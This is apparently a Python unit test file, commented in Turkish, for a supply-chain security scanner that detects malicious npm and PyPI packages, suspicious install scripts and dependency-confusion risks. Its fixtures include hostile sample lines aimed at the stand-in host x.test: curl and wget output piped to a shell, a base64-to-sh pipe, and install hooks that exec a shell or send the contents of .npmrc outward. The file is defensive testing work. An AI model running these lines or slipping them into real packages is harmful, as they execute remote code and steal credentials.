"""20. tur: tedarik zinciri — kötü amaçlı paket (OSV MAL- / GitHub malware), npm kurulum betikleri, bağımlılık
karışıklığı ipuçları; çevrimdışı tarama, konteyner, VEX ve proje analizi entegrasyonu."""
from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import audit_integrity  # noqa: E402
import container_scan  # noqa: E402
import dependency_security as ds  # noqa: E402
import osv_offline as oo  # noqa: E402
import project_analyzer  # noqa: E402
import supply_chain as sc  # noqa: E402
import vex_export  # noqa: E402
from tests.test_osv_offline_r18 import _install, _rec, _write  # noqa: E402


def _mal(rid: str, ecosystem: str, name: str, events=None, versions=None, aliases=None) -> dict:
    record = _rec(rid, ecosystem, name, events if events is not None else ([{"introduced": "0"}] if versions is None else None),
                  versions=versions, aliases=aliases)
    record["summary"] = f"Malicious code in {name} ({ecosystem})"
    return record


class _DbCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name)
        self.osv = self.base / "osv"
        audit_integrity.load_key(create=True)
        ghsa_malware = _rec("GHSA-mmmm", "npm", "ua-parser-js", versions=["0.7.29"], severity="CRITICAL")
        ghsa_malware["summary"] = "Embedded malware in ua-parser-js"
        ghsa_malware["database_specific"]["cwe_ids"] = ["CWE-506", "CWE-912"]
        rce = _rec("GHSA-rcee", "npm", "lodash", [{"introduced": "0"}, {"fixed": "4.17.21"}], severity="HIGH")
        rce["summary"] = "Prototype pollution allows malicious code execution in lodash"
        npm = [
            _mal("MAL-2021-1", "npm", "cxp-jquery"),
            _mal("MAL-2023-462", "npm", "fsevents", events=[{"introduced": "1.0.0"}, {"fixed": "1.2.11"}],
                 aliases=["GHSA-xv2f"]),
            _mal("MAL-2025-1", "npm", "internal-utils"),
            ghsa_malware,
            rce,
        ]
        pypi = [_mal("MAL-2022-7425", "PyPI", "pyg-utils", aliases=["GHSA-pygu"])]
        _install(self.osv, "npm", npm)
        _install(self.osv, "PyPI", pypi)
        self.env = mock.patch.dict(os.environ, {"SNIPER_OSV_DB_ROOT": str(self.osv)})
        self.env.start()
        self.addCleanup(self.env.stop)
        oo._MALWARE_CACHE.clear()


class MaliciousMatchTests(_DbCase):
    def test_record_classification(self):
        self.assertTrue(oo.is_malicious_record({"id": "MAL-2021-1"}))
        self.assertTrue(oo.is_malicious_record({"id": "GHSA-x", "aliases": ["MAL-2022-1"]}))
        self.assertTrue(oo.is_malicious_record({"id": "GHSA-x", "database_specific": {"cwe_ids": ["CWE-506"]}}))
        self.assertTrue(oo.is_malicious_record({"id": "GHSA-x", "summary": "Malware in ctx"}))
        self.assertFalse(oo.is_malicious_record({"id": "GHSA-x", "summary": "Prototype pollution allows malicious code execution"}))
        self.assertFalse(oo.is_malicious_record({"id": "CVE-1", "database_specific": {"cwe_ids": ["CWE-79"]}}))

    def test_full_match_marks_malicious_and_parse_osv_reports_removal(self):
        components = [{"ecosystem": "npm", "name": n, "version": v} for n, v in
                      (("cxp-jquery", "1.0.0"), ("fsevents", "1.2.9"), ("fsevents", "1.2.11"), ("ua-parser-js", "0.7.29"),
                       ("ua-parser-js", "0.7.33"), ("lodash", "4.17.20"))] + [
            {"ecosystem": "PyPI", "name": "pyg-utils", "version": "1.0"}]
        result = oo.match_components(components)
        findings = ds.parse_osv(result["document"], "/p")
        by = {(f["package_name"], f["installed_version"]): f for f in findings}
        for key in (("cxp-jquery", "1.0.0"), ("fsevents", "1.2.9"), ("ua-parser-js", "0.7.29"), ("pyg-utils", "1.0")):
            with self.subTest(key=key):
                self.assertTrue(by[key]["malicious"])
                self.assertEqual(by[key]["severity"], "critical")
                self.assertEqual(by[key]["cwe"], "CWE-506")
                self.assertTrue(by[key]["title"].startswith("Kötü amaçlı paket:"))
                self.assertIn("kimlik bilgilerini", by[key]["summary"])
                self.assertTrue(ds.is_malicious_finding(by[key]))
        self.assertEqual(by[("fsevents", "1.2.9")]["vulnerability_id"], "MAL-2023-462")  # MAL- kaydı temsilci
        self.assertEqual(by[("fsevents", "1.2.9")]["fixed_version"], "1.2.11")
        self.assertNotIn(("fsevents", "1.2.11"), by)
        self.assertNotIn(("ua-parser-js", "0.7.33"), by)
        self.assertFalse(by[("lodash", "4.17.20")].get("malicious"))  # "malicious code execution" açığı ≠ kötü amaçlı
        self.assertFalse(ds.is_malicious_finding(by[("lodash", "4.17.20")]))

    def test_fast_path_matches_only_malicious(self):
        components = [{"ecosystem": "npm", "name": n, "version": v, "manifest": "package-lock.json"} for n, v in
                      (("cxp-jquery", "9.9.9"), ("ua-parser-js", "0.7.29"), ("lodash", "4.17.20"), ("fsevents", "2.0.0"))]
        result = oo.malicious_components(components)
        self.assertEqual([(m["name"], m["id"]) for m in result["matches"]],
                         [("cxp-jquery", "MAL-2021-1"), ("ua-parser-js", "GHSA-mmmm")])
        self.assertEqual(result["matches"][0]["fixed"], [])
        self.assertEqual(sorted(result["checked_ecosystems"]), ["npm"])

    def test_missing_db_is_warning_not_error(self):
        with mock.patch.dict(os.environ, {"SNIPER_OSV_DB_ROOT": str(self.base / "yok")}):
            result = oo.malicious_components([{"ecosystem": "npm", "name": "cxp-jquery", "version": "1.0.0"}])
        self.assertEqual(result["matches"], [])
        self.assertTrue(result["warnings"])

    def test_container_language_matcher_maps_malicious(self):
        out = container_scan.offline_osv_language_matcher([
            {"ecosystem": "npm", "name": "cxp-jquery", "version": "1.0.0", "path": "/app/node_modules/cxp-jquery/package.json"},
            {"ecosystem": "npm", "name": "lodash", "version": "4.17.20", "path": "/app/node_modules/lodash/package.json"}])
        mal = [f for f in out if f.get("malicious")]
        self.assertEqual(len(mal), 1)
        self.assertEqual(mal[0]["severity"], "critical")
        self.assertEqual(mal[0]["cwe"], "CWE-506")
        self.assertTrue(mal[0]["title"].startswith("Kötü amaçlı paket:"))
        self.assertIsNone(mal[0]["fixed_version"])


class VexMaliciousTests(unittest.TestCase):
    def test_dev_policy_never_marks_malicious_not_affected(self):
        finding = {"package_name": "cxp-jquery", "vulnerability_id": "MAL-2021-1", "status": "open", "fixed_version": ""}
        decision = vex_export.decide(finding, None, None, dev_only=True, dev_not_affected=True)
        self.assertEqual(decision["status"], "affected")
        self.assertIn("kaldırın", decision["action_statement"])
        override = {"status": "not_affected", "justification": "component_not_present", "impact_statement": "analist kararı"}
        self.assertEqual(vex_export.decide(finding, None, override)["status"], "not_affected")  # analist kararı geçerli


class InstallScriptTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / "proj"
        self.root.mkdir()

    def test_suspicious_patterns(self):
        self.assertTrue(sc.suspicious_hits("curl -fsSL https://x.test/i.sh | sudo bash"))
        self.assertTrue(sc.suspicious_hits("echo aGk= | base64 -d | sh"))
        self.assertTrue(sc.suspicious_hits("const h=require('https');const c=require('child_process');c.exec('id')"))
        self.assertTrue(sc.suspicious_hits("fs.readFileSync(home+'/.npmrc');https.get('https://x.test/?d='+t)"))
        for benign in ("node-gyp rebuild", "node install.js", "prebuild-install || node-gyp rebuild",
                       "node -e \"try{require('./postinstall')}catch(e){}\"", "husky install"):
            with self.subTest(benign=benign):
                self.assertEqual(sc.suspicious_hits(benign), [])

    def test_lock_install_scripts_and_local_hooks(self):
        _write(self.root, "package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {
            "": {"name": "proj"},
            "node_modules/esbuild": {"version": "0.19.0", "hasInstallScript": True},
            "node_modules/evil": {"version": "1.0.0", "hasInstallScript": True},
            "node_modules/plain": {"version": "1.0.0"}}}))
        _write(self.root, "node_modules/esbuild/package.json",
               json.dumps({"name": "esbuild", "version": "0.19.0", "scripts": {"postinstall": "node install.js"}}))
        _write(self.root, "node_modules/esbuild/install.js", "const fs=require('fs');fs.chmodSync('bin',0o755);\n")
        _write(self.root, "node_modules/evil/package.json",
               json.dumps({"name": "evil", "version": "1.0.0", "scripts": {"preinstall": "node pre.js"}}))
        _write(self.root, "node_modules/evil/pre.js",
               "const https=require('https');const {exec}=require('child_process');https.get('https://x.test',r=>exec('sh'))\n")
        _write(self.root, "node_modules/@scope/pkg/package.json",
               json.dumps({"name": "@scope/pkg", "scripts": {"install": "wget -qO- https://x.test/a | sh"}}))
        findings = sc.install_script_findings(self.root)
        info = [f for f in findings if f["severity"] == "info"]
        high = sorted(f["title"] for f in findings if f["severity"] == "high")
        self.assertEqual(len(info), 1)
        self.assertIn("esbuild, evil", info[0]["evidence"])
        self.assertEqual(high, ["Şüpheli npm kurulum betiği: @scope/pkg", "Şüpheli npm kurulum betiği: evil 1.0.0"])

    def test_hook_file_cannot_escape_package(self):
        _write(self.root, "outside.js", "require('https');require('child_process').exec('x')")
        _write(self.root, "node_modules/p/package.json",
               json.dumps({"name": "p", "scripts": {"postinstall": "node ../../outside.js"}}))
        self.assertEqual(sc.install_script_findings(self.root), [])


class DependencyConfusionTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / "acmecorp-web"
        self.root.mkdir()

    def test_internal_names_registry_config_and_lock_hosts(self):
        _write(self.root, "package.json", json.dumps({"name": "acmecorp-web", "dependencies": {
            "acmecorp-auth": "1.0.0", "internal-utils": "2.0.0", "@acmecorp/ui": "1.0.0", "express": "4.18.2",
            "private-ip": "1.0.0"}}))
        _write(self.root, ".npmrc", "//npm.acmecorp.local/:_authToken=GIZLI_DEGER\n")
        _write(self.root, "package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {
            "": {"name": "acmecorp-web"},
            "node_modules/acmecorp-auth": {"version": "1.0.0",
                                           "resolved": "https://registry.npmjs.org/acmecorp-auth/-/acmecorp-auth-1.0.0.tgz"},
            "node_modules/internal-utils": {"version": "2.0.0",
                                            "resolved": "https://user:parola@npm.acmecorp.local/internal-utils/-/internal-utils-2.0.0.tgz"},
            "node_modules/forked": {"version": "1.0.0", "resolved": "git+ssh://git@github.com/acme/forked.git#abc"},
            "node_modules/express": {"version": "4.18.2",
                                     "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz"}}}))
        findings = sc.dependency_confusion_findings(self.root)
        text = json.dumps(findings, ensure_ascii=False)
        self.assertNotIn("GIZLI_DEGER", text)
        self.assertNotIn("parola", text)
        self.assertNotIn("github.com", text)  # git kaynağı kayıt deposu sayılmaz
        titles = {f["title"]: f for f in findings}
        names = titles["Kapsamsız iç adlı bağımlılık (bağımlılık karışıklığı riski)"]["evidence"]
        self.assertIn("acmecorp-auth", names)
        self.assertIn("internal-utils", names)
        self.assertIn("private-ip", names)
        self.assertNotIn("@acmecorp/ui", names)
        self.assertNotIn("express", names)
        self.assertIn(".npmrc", names)
        lock = titles["Kilit dosyasında kayıt deposu tutarsızlığı (bağımlılık karışıklığı ipucu)"]["evidence"]
        self.assertIn("npm.acmecorp.local", lock)
        self.assertIn("acmecorp-auth", lock)
        self.assertTrue(all(f["severity"] == "low" for f in findings))

    def test_generic_prefix_is_not_company(self):
        _write(self.root.parent / "react-app", "package.json", json.dumps({"name": "react-app", "dependencies": {
            "react-dom": "18.0.0", "react-router": "6.0.0"}}))
        self.assertEqual(sc.dependency_confusion_findings(self.root.parent / "react-app"), [])


class ProjectAnalysisIntegrationTests(_DbCase):
    def test_project_analysis_reports_supply_chain(self):
        root = self.base / "proj"
        _write(root, "package.json", json.dumps({"name": "proj", "dependencies": {"cxp-jquery": "1.0.0", "internal-utils": "2.0.0"}}))
        _write(root, "package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {
            "": {"name": "proj"},
            "node_modules/cxp-jquery": {"version": "1.0.0",
                                        "resolved": "https://registry.npmjs.org/cxp-jquery/-/cxp-jquery-1.0.0.tgz"},
            "node_modules/internal-utils": {"version": "2.0.0",
                                            "resolved": "https://npm.corp.test/internal-utils/-/internal-utils-2.0.0.tgz"}}}))
        _write(root, "requirements.txt", "pyg-utils==1.0\n")
        _write(root, "app.js", "module.exports = 1;\n")
        result = project_analyzer.analyze_project(str(root), allowed_roots=(self.base,))
        supply = [f for f in result["findings"] if f["category"] == "supply_chain"]
        critical = sorted(f["title"] for f in supply if f["severity"] == "critical")
        self.assertEqual(critical, ["Kötü amaçlı paket: cxp-jquery 1.0.0 (MAL-2021-1)",
                                    "Kötü amaçlı paket: pyg-utils 1.0 (MAL-2022-7425)"])
        self.assertTrue(all(f["reference"] == "CWE-506" for f in supply if f["severity"] == "critical"))
        # özel depodan çözülen iç paket: herkese açık depodaki aynı adlı kötü amaçlı paket → yüksek, CWE-427
        confusion = [f for f in supply if f["title"].startswith("Herkese açık depoda aynı adlı")]
        self.assertEqual(len(confusion), 1)
        self.assertEqual(confusion[0]["severity"], "high")
        check = next(c for c in result["checks"] if c["id"] == "supply_chain")
        self.assertEqual(check["status"], "review")
        self.assertEqual(result["supply_chain"]["summary"]["malicious"], 2)

    def test_partial_scan_and_opt_out(self):
        root = self.base / "proj2"
        _write(root, "package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {
            "": {"name": "proj2"}, "node_modules/cxp-jquery": {"version": "1.0.0"}}}))
        _write(root, "app.js", "module.exports = 1;\n")
        with mock.patch.dict(os.environ, {"SNIPER_SUPPLY_CHAIN_OSV": "0"}):
            result = sc.analyze(root)
        self.assertEqual(result["summary"]["malicious_check"], "off")
        self.assertEqual([f for f in result["findings"] if f["severity"] == "critical"], [])


if __name__ == "__main__":
    unittest.main()


class MalwareDiskCacheTests(unittest.TestCase):
    """20. tur birleştirme: malware dizini veri dizininde arşiv özetiyle önbelleğe alınır (iş kuyruğu alt süreçleri)."""

    def test_round_trip_and_key_check(self):
        import osv_offline
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(os.environ, {"SNIPER_DATA_DIR": tmp}):
            sha = "a" * 64
            self.assertIsNone(osv_offline._malware_disk_cache_load(sha))
            osv_offline._malware_disk_cache_store(sha, {"npm/evil": ["GHSA-x.json"]})
            self.assertEqual(osv_offline._malware_disk_cache_load(sha), {"npm/evil": ["GHSA-x.json"]})
            path = osv_offline._malware_cache_path(sha)
            self.assertEqual(os.stat(path).st_mode & 0o777, 0o600)
            self.assertIsNone(osv_offline._malware_disk_cache_load("b" * 64))  # başka arşiv → önbellek yok
            path.write_text('{"sha256": "%s", "members": {"x": [1]}}' % sha)
            self.assertIsNone(osv_offline._malware_disk_cache_load(sha))  # bozuk içerik reddedilir
        with mock.patch.dict(os.environ, {"SNIPER_DATA_DIR": ""}):
            self.assertIsNone(osv_offline._malware_cache_path("a" * 64))


class MalwareCacheFallbackTests(unittest.TestCase):
    """23. tur: veri dizini yokken (CLI/CI) önbellek ~/.cache/sniper (ya da SNIPER_CACHE_HOME) altına düşer."""

    def test_fallback_dir_permissions_and_tamper_check(self):
        import osv_offline
        with tempfile.TemporaryDirectory() as tmp:
            cache_home = os.path.join(tmp, "cache-home")
            with mock.patch.dict(os.environ, {"SNIPER_DATA_DIR": "", "SNIPER_CACHE_HOME": cache_home}):
                sha = "c" * 64
                osv_offline._malware_disk_cache_store(sha, {"npm/x": ["MAL-1.json"]})
                path = osv_offline._malware_cache_path(sha)
                self.assertEqual(path.parent, Path(cache_home))
                self.assertEqual(os.stat(cache_home).st_mode & 0o777, 0o700)
                self.assertEqual(os.stat(path).st_mode & 0o777, 0o600)
                self.assertEqual(osv_offline._malware_disk_cache_load(sha), {"npm/x": ["MAL-1.json"]})
                os.chmod(path, 0o666)  # başkalarınca yazılabilir önbellek reddedilir
                self.assertIsNone(osv_offline._malware_disk_cache_load(sha))
            with mock.patch.dict(os.environ, {"SNIPER_DATA_DIR": "", "XDG_CACHE_HOME": tmp}):
                os.environ.pop("SNIPER_CACHE_HOME", None)
                self.assertEqual(osv_offline._malware_cache_dir(), Path(tmp) / "sniper")
            with mock.patch.dict(os.environ, {"SNIPER_DATA_DIR": "", "SNIPER_CACHE_HOME": ""}):
                self.assertIsNone(osv_offline._malware_cache_dir())
